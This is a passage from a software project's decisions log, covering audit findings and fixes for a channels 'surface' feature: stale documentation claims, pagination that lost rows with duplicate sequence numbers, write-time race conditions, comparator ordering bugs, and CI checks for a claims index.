  is the point.** I first recorded a second defect: that pressing Retry produces
  no perceptible feedback, on a browser observation that sampled the DOM every
  100ms for 2s and never caught the loading state. It does not hold.
  `useSurfaceBundle`'s `retry` calls `setPhase({ status: 'loading' })`
  synchronously, and `surfaceViewState` maps a loading bundle to the loading
  view, which renders text as well as the spinner. A localhost fetch of a small
  file completes in single-digit milliseconds, so a 100ms sampler would very
  likely miss a state that genuinely mounted. **The observation was a
  measurement artifact and I accepted it because it was adjacent to a real
  finding** — the same reflex that let the synthetic populated-cell captures be
  reported as three shipped defects in 6c (D169). The user-visible complaint may
  still be real, but its cause is the invisible spinner alone.

  **One smaller one that does hold:** the seed doc quotes two state strings with
  trailing periods the UI does not have, which will break anyone writing an
  exact-text assertion from the doc.

  **An environment hazard worth writing down:** both dev servers were serving a
  white screen, from a `@tamagui/vite-plugin` v2.4.2 cache bug — the extraction
  cache lives on `globalThis` while the map that resolves the emitted
  `X.tsx.tamagui.css` imports is per-plugin-instance, so once the factory
  re-runs against a warm global cache every tamagui file emits a CSS import
  nothing can resolve. It does not self-heal on reload. Worked around without
  restarting anything by forcing per-file cache misses; the next dev-server
  restart re-rolls it.

- **D186: the claims index found five claims that are not merely uncontrolled
  but FALSE at this head, and one of them was a fifth copy of the frame-src
  error.** 126 claims enumerated across the plan, the PR description and the
  how-it-works doc; 97 have a control, 89 of those have a demonstrated negative
  control, 29 have none. The unfillable rows are the document's point and are
  ranked at the top of it.

  The five false ones, each verified by me before acting rather than taken on
  the report's word:

  1. **"Boundary checks: import allowlist, style boundary, token drift,
     deterministic build" — claimed CI-enforced, run nowhere.** All four scripts
     exist under `packages/surface-shell/scripts/` behind `check:all`, and
     nothing invoked them: not `pnpm -r lint` (oxlint only), not `test:ci`
     (vitest only), not any workflow. `check-token-drift.mjs` asserts in its own
     output that it "fails CI when this file is stale", which was false.
     **Wired rather than the claim weakened** — all four pass today, so the
     honest repair is to make the sentence true.
  2. `how-it-works.md:93` said the host CSP "ships disabled" — the FIFTH copy of
     the error D171.5 corrected in four other places. Fixed. Five copies of one
     stale fact across four artifacts is itself the finding.
  3. The PR description says the gate runs "fifteen rules". It ran seventeen
     before this session and eighteen after.
  4. The PR description lists `surface fork` under "Not built". It is built,
     registered in the command table, and has 51 test cases.
  5. Plan §7's caps table states `provenance` as 512 B; the constant is 1024.

  **The structural reason all five survived: `surface-doc-constants.test.ts`
  pins only the four SKILL documents.** The plan, the how-it-works doc and the
  PR body have no drift control at all. Deliberately NOT fixed by extending that
  test to the plan: the skill docs are what a bot reads and are already pinned,
  the plan is a design document read by humans, and adding a repo-root reader to
  a skill-scoped test is machinery out of proportion to the blast radius. The
  claims index is the control for that class now, and it is tracked.

  Two of the five were introduced by this session's own work (3 and, indirectly,
  the count in 5's neighbourhood), which is the argument for the index existing
  at all rather than being a one-off audit artifact.

- **D187: a paginator whose ordering key is not a total order loses rows, and
  duplicate sequence numbers are producible — the backend ships a repairer for
  them.** `getSequencedChannelPosts` ordered by `sequenceNum` alone with a
  `< N` page cursor. On rows `7/A, 7/B, 6, …` it took the first 7, read the
  second as a GAP because it expected 6 next, and then paged with
  `sequenceNum < 7` — excluding the sibling permanently. Hydration still saw
  head 7, still loaded through 1, and still returned `hydrated`. So D174's
  tie-break never saw both rows, and the tie it exists to break was decided by
  whichever row SQLite happened to return first.

  **The question this turned on: can two posts share a sequence number at all?**
  Read out of the Hoon rather than assumed. The answer is **yes, and it has
  already happened**:

  - Normal posting cannot produce one. `++ca-c-post`'s `%add` branch is the only
    place a fresh sequence number is minted (`desk/app/channels-server.hoon:1093`),
    from a per-channel `count` that is incremented before every read and never
    decremented. A rejected hook leaves a GAP, not a repeat.
  - **Migrations did produce them.** `desk/lib/channel-utils.hoon:1584-1598` is
    `+repair-channel`, whose docstring lists "duplicate sequence nrs in the
    posts" among the things past migrations caused; it is wired into
    `state-10-to-11` (`channels-server.hoon:303`). The 7→8 conversion numbered
    `posts` and the `log` with two independent counters over different id sets
    (`desk/lib/channel-conv.hoon:1132-1200`). There is a diagnostic thread whose
    whole job is finding them (`desk/ted/channel/check-posts-integrity.hoon:45`,
    `[%duplicate-seq seq id nest]`), and the type itself concedes the case
    (`desk/sur/channels.hoon:483`, "0 indicates bad migration/broken state").
  - **The client mirror can hold them even where the host does not.**
    `++ca-apply-post` (`desk/app/channels.hoon:2661-2669`) keeps `old`'s `seq`
    and overwrites only replies, reacts and the essay, so a checkpoint never
    corrects a sequence number the client already holds. The corrective round
    trip (`%request-seqs`) has no automatic trigger.

  So this is not defense in depth. It is a real class with a backend repairer,
  and the frontend had no equivalent.

  **The fix, placed at the boundary the property has to hold at — the
  paginator, not the reducer.** Ordering and the page cursor both become the
  pair `(sequenceNum, id)`, and the contiguity walks treat a repeated sequence
  number as another row on the same rung rather than a gap. The SQL order is
  byte order on the id, which is NOT the reducer's canonical order and does not
  need to be: its only job is to enumerate every row exactly once. Which tied
  row WINS stays the reducer's decision, taken over the complete set the
  paginator now delivers.

  **Residual, recorded rather than fixed:** `mode: 'around'` gets the
  deterministic secondary sort but not the tie retention. It indexes a single
  cursor row out of its result and slices around it, so retaining a tie changes
  the window arithmetic — and it is the chat scroller's jump-to path, not the
  surface fold's. Changing it in a correctness round that has no control for the
  scroller would be shipping an unmeasured change to a much larger blast radius.

- **D188: "the pre-state must still hold at write time" was enforced at check
  time, which is a different claim.** Publish, fork and `channels update`/
  `rename` each read a channel, did seconds of asynchronous work — a gate run, a
  bundle upload, an observation budget — and then submitted a COMPLETE stale
  channel value. `%groups` takes the whole cell with no version and no CAS
  token. So: publish reads revision 1, another admin publishes revision 2 during
  the upload, and the first command overwrites revision 2 — after which **its
  own read-back certifies its own overwrite**, which is what made the failure
  silent. Fork sees an empty destination and lands over somebody's new revision.
  `channels rename` sees an ordinary channel, another client publishes a
  surface, and rename drops that definition with no `--allow-unpublish`.

  The scope contract said "at write time" in as many words
  (`surface-write-scope.ts:21`) and the tests only ever mutated state BEFORE the
  command ran. A contract sentence is not a control.

  **Fixed by re-reading the target immediately before the write**
  (`readDefinitionForWrite`), refusing on any change and naming both
  identities, with zero writes. The identity compared is deliberately NARROWER
  than the operator's pre-state bound: that one folds the post head in, so a
  member saying hello during the upload would fail a publish. This one is the
  definition cell and nothing else.

  Two things follow that are worth stating separately:

  1. **The payload is now built from the FRESH channel**, not from the value
     read minutes ago. The full-cell overwrite otherwise drops a concurrent edit
     to an unrelated field — a title, an icon — by another admin, which is the
     same race with a wider blast and no gate at all. Publish and fork now carry
     those forward; `channels update` compares the whole cell and refuses.
  2. **The residual is real and is not v0's to close.** A last-second re-read
     narrows the window from "however long this command takes" to one round
     trip. It does not close it. Closing it needs compare-and-swap on the
     description cell in `%groups` — a backend change, recorded as a v1 item
     alongside the `%surface` agent. v0 claims the narrowing and not the
     guarantee.

- **D189: an optional tie-break key is not a tie-break, and the comparator was
  not a total order.** `SurfacePostView.id` was optional and `comparePostIds`
  returned equality whenever either side was absent, so two tied posts without
  ids sorted in CALLER order — and the exported "posts, any order" contract was
  false for every producer that did not fill the field in. The production
  adapter did fill it in, which is exactly why nothing noticed.

  The comparator was also not a total order in two ways. `1.000` and `1000`
  strip to the same digits at the same length, so neither `<` held and both
  directions returned 1: `a > b` and `b > a` at once. And numeric and
  non-numeric ids were compared raw against each other, closing a cycle —
  `"2" > "1x" > "10" > "2"`.

  `id` is now required at the type level and enforced at runtime (a post with no
  string id is structurally unfoldable, like one with no sequence number, and is
  skipped rather than folded in arrival order). The comparator orders the two
  CLASSES first, then digit count, then digit string, then the raw string. The
  synthetic post sets the gate, the preview and the transition walk build now
  mint deterministic ids of their own — without them those tools would fold in
  array order while a real channel folds in id order, and predicting what the
  channel will do is the only thing they are for.

- **D190: skipping a bad snapshot is not repairing it, and the CLI was not even
  skipping.** `advertisedHead` appeared zero times in `packages/tlon-skill`. The
  D175 guard was client-only, so a snapshot claiming `upTo: 1_000_000` — which
  the client refuses — was folded by the CLI, and `surface snapshot` would then
  write a fresh snapshot out of that fold. That laundered the bad boundary into
  a record the client WOULD accept, while the original still stood.

  The CLI now computes the head from the ship as it hydrates and passes it. It
  has no local store to compare against itself: every post came from the ship on
  this call, so the greatest sequence number IS the server's head, and both
  commands already refuse a truncated page walk before reducing.

  And the fold now REPORTS what it stepped over (`headExceededSnapshots`)
  instead of only logging it, on both the reduced and the migration-pending
  branch. `surface state` folds the real log and names the offending post;
  `surface snapshot` REFUSES. Refusing rather than repairing is the whole point:
  selection takes the GREATEST boundary, so a fresh honest snapshot loses to the
  bad one and the command would report a repair that changed nothing. The repair
  is retracting that post.

- **D191: a marker that contradicts what it sits next to is refused by the
  schema, not by the gate.** `memberInteraction` is the opt-out from a rule that
  only fires on an EMPTY action map, so beside a nonempty one it asserts nothing
  and contradicts the spec it is in. The schema permitted it, lint returned early
  whenever actions existed, and the rubric keys check 8 off the marker's presence
  alone — so an actionful spec could declare "members cannot act", pass the gate
  clean, and generate a display-only check for a board full of controls.

  Refused at the schema because the contradiction is readable by everything that
  validates a spec: the reducer's read-back, `surface show`, the preview, the
  client. A gate-only rule would leave every one of those agreeing that a
  self-contradicting spec is fine.

- **D192: a raw prefix compare is not a path compare.** `inert-action`
  suppressed itself when another rule had already filed a finding against the
  same action, using `specPath.startsWith('actions.' + id)`. `actions.vote` is a
  prefix of `actions.vote-no`, so a malformed `vote-no` masked a genuinely dead
  `vote`: the author repaired one defect, re-ran the gate, and met the other.
  Comparison is now by segment — equal, or followed by `.` or `[`. The gate
  stayed red throughout, so the cost was a wasted repair cycle rather than a
  dead action shipping green; it is still a guard that reported one defect where
  there were two.

- **D193: `surface fork` has no `--surface-id`, so the reused-id fold is
  unconstructible rather than checked for.** The flag let a caller name any id
  but the source's own, and destination emptiness only ever checked the current
  description — not retained posts. Unpublish a surface, leave its events, fork
  a different source in under the old id, and revision-1 events from the old app
  fold straight into the supposedly pristine copy. A boundary-0 snapshot does
  not suppress later old events.

  The landing run now takes the id from the completed rubric sheet, which is the
  artifact that already binds it to these bytes and this definition and is
  already required. Passing `--surface-id` is now an unknown-option refusal.

  **Stated honestly:** this removes the OVERRIDE, not every path to a reused id.
  A caller who hand-edits the staged spec before previewing gets a sheet keyed
  to whatever they wrote. That is forging the binding artifact rather than using
  a documented flag, and it is materially different — but it is not "impossible",
  and claiming impossibility here would be the kind of sentence this project
  keeps having to retract. If a genuine need for a caller-chosen id appears, it
  is a report, not a reason to put the flag back.

- **D194: a halt belongs to the session that failed, not to the component.**
  `SurfaceSandboxContainer` stored an init error as a bare message and returned
  the halted view ABOVE the keyed host — so a board halted on revision 1 could
  not mount revision 2. An admin publishing the fix changed nothing for anybody
  already looking at the broken board: every mounted viewer stayed on revision
  1's error until they pressed Reload or navigated away, which is exactly the
  population that cannot be told to do either.

  The halt now names the session that produced it, and the render shows it only
  when that session is the one being mounted. A new revision and a manual reload
  are both new sessions, so `reloadSurface` no longer clears the halt
  separately — clearing it would be a second representation of one fact, free to
  disagree with the first.

- **D195: the template notes are pinned, because the wording gets copied.**
  Countdown's note said the whole `bundle` block was placeholders publish
  overwrites. It is not: publish owns `assetRef`, `sha256` and `size`, and
  preserves the author's `shellVersion` — the one field in the block whose loss
  is not repaired by the next publish, because publish defaults an absent one to
  1 and old clients then run a bundle that needs shell 2.

  Every template is pinned, not just the one that drifted, because the wording
  was copied between templates and the next drift will be too. Three templates
  carried no bundle note at all, which is the same defect with nothing to read;
  they have one now.

- **D196: the third framing rule, stated as a rule.** Two rules already govern
  this work: the class fix is the deliverable, not the incident; and a control
  enters the tree with the mutation that should break it demonstrated. This
  round found a third, and every one of its findings was an instance of it:

  > **Where does the property have to hold, and is the control there?**

  Both Highs and the survivor were controls placed one layer from the boundary.
  The tie-break lived in the reducer while the rows were lost in the paginator
  (D187). The pre-state check ran at check time while the write happened at
  write time (D188). The head guard lived in the client while the CLI folded and
  then wrote (D190). Each control was correct where it stood and enforced
  nothing, because the thing it was protecting against happened somewhere else.
  A control one layer off is the hardest kind to see: it passes, it is about the
  right subject, and reading it tells you nothing about the gap. The question has
  to be asked separately.

- **D197: the claims index names a commit, and CI holds it to that — but the
  exact-tree claim is a gate only where the index's owners are the ones moving
  the file.** The index identified itself as a dirty working tree at
  `2c62221d7b` and said in its own header that nothing in it was verified
  against any commit. An index that cannot say which tree it describes is a
  claim, not evidence — the exact failure it was written to catch in everyone
  else's documents, uncaught in its own.

  `scripts/check-claims-index.mjs` runs from `ci-config-check` — the one job
  with no path filter, because the index is a root markdown that matches none
  and a gated job would skip exactly when it is needed. Four checks, one per way
  the document rots: a citation whose file or line is gone; a named test that no
  longer exists; a recorded head that is not a real commit or not an ancestor of
  HEAD; and the dirty-tree disclaimer coming back. Each was demonstrated by
  making the break and watching the check fail.

  **The fourth property — "no file the index cites has moved since the recorded
  head" — is split by ownership, and that is a deliberate departure from how it
  was specified.** As a flat repo-wide failure it is correct and unaffordable:
  the index cites `DECISIONS.md`, `.github/workflows/ci.yml`,
  `apps/tlon-web/e2e/test-fixtures.ts` and `packages/shared/src/db/queries.ts`
  among its 113 paths, so after this branch merges, most pull requests in the
  repository would go red until somebody regenerated a Surface Channels document
  they have nothing to do with. That is machinery whose blast radius nobody
  costed — the thing this project has already had to name once. So drift in a
  surface-owned path (`packages/tlon-skill/`, the three surface source
  directories, `packages/surface-shell/`, `SurfaceChannel/`, `sandbox-posture/`,
  `hostCsp.ts`, the root `surface-channels-*.md` documents) fails; drift
  anywhere else is reported by name and the run stays green. The hard gate sits
  where the claims are load-bearing and where the person moving the file is the
  person who owns the index.

  Two mechanical consequences, recorded because both are easy to trip over.
  The check needs the recorded commit to exist, so its job checks out with
  `fetch-depth: 0`. And the index must be re-stamped in a commit of its OWN,
  after the commit whose sha it names — a document cannot carry the sha of the
  commit that contains it, and stamping it separately leaves only the index in
  the diff the check reads.
